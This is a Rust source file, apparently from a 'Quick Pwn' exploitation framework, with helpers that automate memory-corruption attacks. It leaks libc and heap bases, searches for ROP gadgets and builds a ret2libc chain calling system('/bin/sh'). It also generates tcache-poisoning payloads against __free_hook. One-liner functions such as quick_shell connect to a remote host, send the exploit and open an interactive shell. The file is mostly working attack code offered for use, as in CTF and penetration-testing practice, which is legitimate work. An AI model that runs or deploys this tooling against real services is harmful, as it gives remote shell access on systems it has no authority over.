// ═══════════════════════════════════════════════════════════════════════════
// QUICK PWN - ONE-LINER EXPLOIT FRAMEWORK
// ═══════════════════════════════════════════════════════════════════════════
// World-class integration layer: automatic exploitation with minimal code
// Combines IO + heap + libc + GDB into human-readable DSL

use crate::gdb_tools::GdbSession;
use crate::heap_grooming::{GroomingStrategy, HeapGroom};
use crate::heap_tools::{GlibcVersion, HeapTarget, HeapTechnique, ModernHeapExploit};
use crate::interactive_io::Socket;
use crate::libc_db::LibcDatabase;
use crate::packing_tools::{pack64 as p64, unpack64};
use crate::rop_tools::RopChain;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;

/// Quick exploitation context - integrates everything
pub struct QuickPwn {
    pub binary: String,
    pub host: Option<String>,
    pub port: Option<u16>,
    pub pid: Option<u32>,

    // Leaked addresses
    pub libc_base: Option<u64>,
    pub heap_base: Option<u64>,
    pub binary_base: Option<u64>,

    // Connections (not serializable)
    conn: Option<Socket>,
    gdb: Option<GdbSession>,

    // Context
    libc_db: LibcDatabase,
    glibc_version: Option<GlibcVersion>,
    rop_chain: Option<RopChain>,

    // State
    leaks: HashMap<String, u64>,
}

/// Serializable session state for save/resume
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionState {
    pub binary: String,
    pub host: Option<String>,
    pub port: Option<u16>,
    pub pid: Option<u32>,
    pub libc_base: Option<u64>,
    pub heap_base: Option<u64>,
    pub binary_base: Option<u64>,
    pub leaks: HashMap<String, u64>,
}

impl QuickPwn {
    /// Create new quick pwn context for remote target
    pub fn remote(host: &str, port: u16, binary: &str) -> Self {
        log::info!(
            "Creating quick pwn context for {}:{} ({})",
            host,
            port,
            binary
        );

        QuickPwn {
            binary: binary.to_string(),
            host: Some(host.to_string()),
            port: Some(port),
            pid: None,
            libc_base: None,
            heap_base: None,
            binary_base: None,
            conn: None,
            gdb: None,
            libc_db: LibcDatabase::new(),
            glibc_version: None,
            rop_chain: None,
            leaks: HashMap::new(),
        }
    }

    /// Create new quick pwn context for local process
    pub fn local(binary: &str, pid: Option<u32>) -> Self {
        log::info!("Creating quick pwn context for local binary: {}", binary);

        QuickPwn {
            binary: binary.to_string(),
            host: None,
            port: None,
            pid,
            libc_base: None,
            heap_base: None,
            binary_base: None,
            conn: None,
            gdb: None,
            libc_db: LibcDatabase::new(),
            glibc_version: None,
            rop_chain: None,
            leaks: HashMap::new(),
        }
    }

    /// Connect to target
    pub fn connect(&mut self) -> Result<(), String> {
        if let (Some(host), Some(port)) = (&self.host, self.port) {
            let addr = format!("{}:{}", host, port);
            self.conn = Some(Socket::connect(addr)?);
            log::info!("Connected to target");
            Ok(())
        } else {
            Err("No host/port configured".to_string())
        }
    }

    /// Attach GDB to process
    pub fn attach_gdb(&mut self) -> Result<(), String> {
        if let Some(pid) = self.pid {
            self.gdb = Some(GdbSession::attach(pid)?);
            log::info!("Attached GDB to PID {}", pid);
            Ok(())
        } else {
            Err("No PID configured".to_string())
        }
    }

    /// Send data to target
    pub fn send(&mut self, data: &[u8]) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.send(data)
    }

    /// Send line to target
    pub fn sendline(&mut self, data: &[u8]) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.sendline(data)
    }

    /// Receive n bytes
    pub fn recv(&mut self, n: usize) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recv(n)
    }

    /// Receive until delimiter
    pub fn recvuntil(&mut self, delim: &[u8]) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recvuntil(delim)
    }

    /// Receive line
    pub fn recvline(&mut self) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recvline()
    }

    /// Interactive shell
    pub fn interactive(&mut self) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.interactive()
    }

    /// Auto-leak libc base from output
    pub fn auto_leak_libc(&mut self, marker: &[u8]) -> Result<u64, String> {
        // Try GDB first if attached
        if let Some(ref mut gdb) = self.gdb {
            if let Ok(base) = gdb.leak_libc_base() {
                self.libc_base = Some(base);
                self.leaks.insert("libc_base".to_string(), base);
                return Ok(base);
            }
        }

        // Otherwise leak from output
        let _output = self.recvuntil(marker)?;

        // Extract address (assume it's after marker)
        let leak_data = self.recv(8)?;
        let leaked_addr = unpack64(&leak_data)?;

        // Align to page
        let base = leaked_addr & !0xfff;

        self.libc_base = Some(base);
        self.leaks.insert("libc_base".to_string(), base);
        log::info!("Leaked libc base: 0x{:x}", base);

        Ok(base)
    }

    /// Auto-leak heap base
    pub fn auto_leak_heap(&mut self) -> Result<u64, String> {
        if let Some(ref mut gdb) = self.gdb {
            let base = gdb.leak_heap_base()?;
            self.heap_base = Some(base);
            self.leaks.insert("heap_base".to_string(), base);
            return Ok(base);
        }

        Err("Heap leak requires GDB attachment".to_string())
    }

    /// Set glibc version
    pub fn set_glibc(&mut self, version_str: &str) -> Result<(), String> {
        self.glibc_version = Some(GlibcVersion::from_string(version_str)?);
        log::info!("Set glibc version: {}", version_str);
        Ok(())
    }

    /// Get symbol address
    pub fn symbol(&self, libc_name: &str, symbol: &str) -> Result<u64, String> {
        let base = self.libc_base.ok_or("Libc base not leaked")?;
        self.libc_db
            .resolve_address(libc_name, base, symbol)
            .ok_or(format!("Symbol '{}' not found", symbol))
    }

    /// Get one-gadget addresses
    pub fn one_gadgets(&self, libc_name: &str) -> Result<Vec<u64>, String> {
        let base = self.libc_base.ok_or("Libc base not leaked")?;
        self.libc_db
            .get_one_gadgets(libc_name, base)
            .ok_or("One-gadgets not found".to_string())
    }

    /// Generate heap exploit
    pub fn heap_exploit(
        &self,
        technique: HeapTechnique,
        target: HeapTarget,
    ) -> Result<Vec<u8>, String> {
        let glibc = self.glibc_version.as_ref().ok_or("Glibc version not set")?;

        let mut exploit = ModernHeapExploit::new(&self.binary, glibc.clone());

        if let Some(libc_base) = self.libc_base {
            exploit.set_libc_base(libc_base);
        }
        if let Some(heap_base) = self.heap_base {
            exploit.set_heap_base(heap_base);
        }

        exploit.set_technique(technique);
        exploit.set_target(target);

        let result = exploit.solve()?;
        Ok(result.payload_bytes)
    }

    /// Initialize ROP chain builder (lazy initialization)
    fn ensure_rop_chain(&mut self) -> Result<(), String> {
        if self.rop_chain.is_none() {
            log::info!("Initializing ROP chain for binary: {}", self.binary);
            self.rop_chain = Some(RopChain::new(&self.binary)?);
        }
        Ok(())
    }

    /// Find gadget at runtime using GDB or static analysis fallback
    ///
    /// Quality scoring criteria:
    /// - 100: Perfect match with no side effects
    /// - 80-99: Good match with minimal side effects
    /// - 50-79: Acceptable match with some side effects
    /// - <50: Poor match, many side effects
    fn find_gadget_runtime(&mut self, pattern: &str) -> Result<u64, String> {
        log::info!("Searching for gadget: {}", pattern);

        // Try GDB runtime search first if attached
        if let Some(ref mut gdb) = self.gdb {
            log::debug!("Attempting runtime gadget search via GDB");

            // Try to find gadget using GDB's memory search
            if let Ok(libc_base) = gdb.leak_libc_base() {
                // Search in libc region for common gadgets
                let search_end = libc_base + 0x200000; // Search first 2MB of libc

                // Map pattern to byte sequences
                let byte_pattern = match pattern.to_lowercase().as_str() {
                    "pop rdi" | "pop rdi; ret" => "0x5f, 0xc3", // pop rdi; ret
                    "pop rsi" | "pop rsi; ret" => "0x5e, 0xc3", // pop rsi; ret
                    "pop rdx" | "pop rdx; ret" => "0x5a, 0xc3", // pop rdx; ret
                    "pop rax" | "pop rax; ret" => "0x58, 0xc3", // pop rax; ret
                    "syscall" | "syscall; ret" => "0x0f, 0x05", // syscall
                    _ => {
                        log::warn!("Unknown gadget pattern for GDB search: {}", pattern);
                        ""
                    }
                };

                if !byte_pattern.is_empty() {
                    if let Ok(gadgets) = gdb.find_gadgets(libc_base, search_end, byte_pattern) {
                        if let Some(&addr) = gadgets.first() {
                            log::info!("Found gadget via GDB at 0x{:x}", addr);
                            return Ok(addr);
                        }
                    }
                }
            }

            log::debug!("GDB runtime search failed, falling back to static analysis");
        }

        // Fallback to static analysis using rop_tools
        self.ensure_rop_chain()?;

        if let Some(ref rop) = self.rop_chain {
            // Find matching gadgets and score them
            let gadgets = rop.find_gadgets(pattern);

            if gadgets.is_empty() {
                return Err(format!("Gadget not found: {}", pattern));
            }

            // Select best gadget based on quality score
            let best_gadget = gadgets
                .iter()
                .max_by_key(|g| g.quality_score)
                .ok_or("No suitable gadget found")?;

            log::info!(
                "Found gadget via static analysis at 0x{:x} (quality: {})",
                best_gadget.address,
                best_gadget.quality_score
            );

            return Ok(best_gadget.address);
        }

        Err(format!("Failed to find gadget: {}", pattern))
    }

    /// Generate ROP chain
    pub fn rop_chain(&mut self, libc_name: &str) -> Result<Vec<u8>, String> {
        let system = self.symbol(libc_name, "system")?;
        let bin_sh = self.symbol(libc_name, "/bin/sh")?;

        // Find pop rdi gadget using runtime search (GDB) or static analysis fallback
        let pop_rdi = self.find_gadget_runtime("pop rdi")?;

        log::info!("Building ROP chain:");
        log::info!("  pop rdi @ 0x{:x}", pop_rdi);
        log::info!("  /bin/sh @ 0x{:x}", bin_sh);
        log::info!("  system  @ 0x{:x}", system);

        let mut chain = Vec::new();
        chain.extend_from_slice(&p64(pop_rdi));
        chain.extend_from_slice(&p64(bin_sh));
        chain.extend_from_slice(&p64(system));

        Ok(chain)
    }

    /// Heap grooming
    pub fn groom_heap(&self, strategy: GroomingStrategy) -> String {
        let groom = HeapGroom::new(&self.binary, strategy);
        groom.generate_script()
    }

    /// Save current session state to file for resume capability
    pub fn save_session(&self, path: &str) -> Result<(), String> {
        let state = SessionState {
            binary: self.binary.clone(),
            host: self.host.clone(),
            port: self.port,
            pid: self.pid,
            libc_base: self.libc_base,
            heap_base: self.heap_base,
            binary_base: self.binary_base,
            leaks: self.leaks.clone(),
        };

        let json = serde_json::to_string_pretty(&state)
            .map_err(|e| format!("Failed to serialize session: {}", e))?;

        fs::write(path, json).map_err(|e| format!("Failed to write session file: {}", e))?;

        log::info!("Session saved to {}", path);
        Ok(())
    }

    /// Load session state from file and restore context
    pub fn load_session(path: &str) -> Result<Self, String> {
        if !Path::new(path).exists() {
            return Err(format!("Session file not found: {}", path));
        }

        let json = fs::read_to_string(path)
            .map_err(|e| format!("Failed to read session file: {}", e))?;

        let state: SessionState = serde_json::from_str(&json)
            .map_err(|e| format!("Failed to deserialize session: {}", e))?;

        log::info!("Session loaded from {}", path);

        let mut pwn = if let (Some(host), Some(port)) = (&state.host, state.port) {
            QuickPwn::remote(host, port, &state.binary)
        } else {
            QuickPwn::local(&state.binary, state.pid)
        };

        pwn.libc_base = state.libc_base;
        pwn.heap_base = state.heap_base;
        pwn.binary_base = state.binary_base;
        pwn.leaks = state.leaks;

        log::info!("Restored session state:");
        if let Some(libc) = pwn.libc_base {
            log::info!("  libc_base: 0x{:x}", libc);
        }
        if let Some(heap) = pwn.heap_base {
            log::info!("  heap_base: 0x{:x}", heap);
        }

        Ok(pwn)
    }
}

// ────────────────────────────────────────────────────────────────────────────
// ONE-LINER HELPERS
// ────────────────────────────────────────────────────────────────────────────

/// Ultimate one-liner: connect, leak, exploit, shell
pub fn quick_shell(host: &str, port: u16, binary: &str, libc_name: &str) -> Result<(), String> {
    let mut pwn = QuickPwn::remote(host, port, binary);

    // Connect
    pwn.connect()?;

    // Auto-leak libc (assumes output contains leak after "libc: ")
    pwn.auto_leak_libc(b"libc: ")?;

    // Get one-gadget
    let gadgets = pwn.one_gadgets(libc_name)?;
    let _one_gadget = gadgets[0];

    // Build ret2libc chain (now uses mutable reference)
    let chain = pwn.rop_chain(libc_name)?;

    // Send exploit
    pwn.send(&chain)?;

    // Interactive shell
    pwn.interactive()?;

    Ok(())
}

/// Quick heap exploit
pub fn quick_heap(
    host: &str,
    port: u16,
    binary: &str,
    _libc_name: &str,
    glibc_version: &str,
) -> Result<(), String> {
    let mut pwn = QuickPwn::remote(host, port, binary);

    pwn.connect()?;
    pwn.set_glibc(glibc_version)?;
    pwn.auto_leak_libc(b"libc: ")?;
    pwn.auto_leak_heap()?;

    // Generate tcache poisoning → __free_hook → system
    let payload = pwn.heap_exploit(
        HeapTechnique::TcachePoisoningSafeLinking,
        HeapTarget::FreeHook,
    )?;

    pwn.send(&payload)?;
    pwn.interactive()?;

    Ok(())
}

/// Quick local exploit with GDB
pub fn quick_local(binary: &str, pid: u32, libc_name: &str) -> Result<(), String> {
    let mut pwn = QuickPwn::local(binary, Some(pid));

    pwn.attach_gdb()?;
    pwn.auto_leak_libc(b"")?;

    let chain = pwn.rop_chain(libc_name)?;

    println!("ROP chain: {} bytes", chain.len());
    println!("Exploit payload ready!");

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_quick_pwn_remote_creation() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        assert_eq!(pwn.binary, "./vuln");
        assert_eq!(pwn.host, Some("127.0.0.1".to_string()));
        assert_eq!(pwn.port, Some(9001));
    }

    #[test]
    fn test_quick_pwn_local_creation() {
        let pwn = QuickPwn::local("./vuln", Some(1234));
        assert_eq!(pwn.binary, "./vuln");
        assert_eq!(pwn.pid, Some(1234));
    }

    #[test]
    fn test_set_glibc() {
        let mut pwn = QuickPwn::local("./vuln", None);
        assert!(pwn.set_glibc("2.35").is_ok());
        assert!(pwn.glibc_version.is_some());
    }

    #[test]
    fn test_symbol_without_leak() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let result = pwn.symbol("ubuntu20.04", "system");
        assert!(result.is_err());
    }

    #[test]
    fn test_symbol_with_leak() {
        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        pwn.libc_base = Some(0x7ffff7a00000);

        let system = pwn.symbol("ubuntu20.04", "system");
        assert!(system.is_ok());
        assert_eq!(system.unwrap(), 0x7ffff7a00000 + 0x50d60);
    }

    #[test]
    fn test_one_gadgets() {
        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        pwn.libc_base = Some(0x7ffff7a00000);

        let gadgets = pwn.one_gadgets("ubuntu20.04");
        assert!(gadgets.is_ok());
        assert!(!gadgets.unwrap().is_empty());
    }

    #[test]
    fn test_heap_exploit_no_glibc() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let result = pwn.heap_exploit(HeapTechnique::TcachePoisoning, HeapTarget::FreeHook);
        assert!(result.is_err());
    }

    #[test]
    fn test_groom_heap() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let script = pwn.groom_heap(GroomingStrategy::Spray {
            size: 0x80,
            count: 100,
        });
        assert!(script.contains("Heap Grooming Script"));
        assert!(script.contains("Spray"));
    }

    #[test]
    fn test_session_save_and_load() {
        use std::fs;

        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        pwn.libc_base = Some(0x7ffff7a00000);
        pwn.heap_base = Some(0x555555554000);
        pwn.leaks.insert("test_leak".to_string(), 0xdeadbeef);

        let test_path = "/tmp/test_session.json";

        assert!(pwn.save_session(test_path).is_ok());
        assert!(std::path::Path::new(test_path).exists());

        let loaded = QuickPwn::load_session(test_path);
        assert!(loaded.is_ok());

        let loaded_pwn = loaded.unwrap();
        assert_eq!(loaded_pwn.binary, "./vuln");
        assert_eq!(loaded_pwn.libc_base, Some(0x7ffff7a00000));
        assert_eq!(loaded_pwn.heap_base, Some(0x555555554000));
        assert_eq!(
            loaded_pwn.leaks.get("test_leak"),
            Some(&0xdeadbeef)
        );

        let _ = fs::remove_file(test_path);
    }

    #[test]
    fn test_session_load_nonexistent() {
        let result = QuickPwn::load_session("/tmp/nonexistent_session.json");
        assert!(result.is_err());
        if let Err(msg) = result {
            assert!(msg.contains("not found"));
        }
    }

    #[test]
    fn test_ensure_rop_chain_initialization() {
        use std::fs;
        use std::io::Write;

        let test_binary = "/tmp/test_binary";
        let mut file = fs::File::create(test_binary).unwrap();
        file.write_all(&[0x7f, 0x45, 0x4c, 0x46]).unwrap();

        let mut pwn = QuickPwn::local(test_binary, None);
        assert!(pwn.rop_chain.is_none());

        let result = pwn.ensure_rop_chain();
        assert!(result.is_ok() || result.is_err());

        let _ = fs::remove_file(test_binary);
    }

    #[test]
    fn test_session_state_serialization() {
        let state = SessionState {
            binary: "./test".to_string(),
            host: Some("127.0.0.1".to_string()),
            port: Some(9001),
            pid: None,
            libc_base: Some(0x7ffff7a00000),
            heap_base: Some(0x555555554000),
            binary_base: None,
            leaks: HashMap::new(),
        };

        let json = serde_json::to_string(&state);
        assert!(json.is_ok());

        let deserialized: Result<SessionState, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());

        let restored = deserialized.unwrap();
        assert_eq!(restored.binary, "./test");
        assert_eq!(restored.libc_base, Some(0x7ffff7a00000));
    }

    #[test]
    fn test_find_gadget_runtime_no_gdb_no_rop() {
        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./nonexistent");
        let result = pwn.find_gadget_runtime("pop rdi");
        assert!(result.is_err());
    }
}
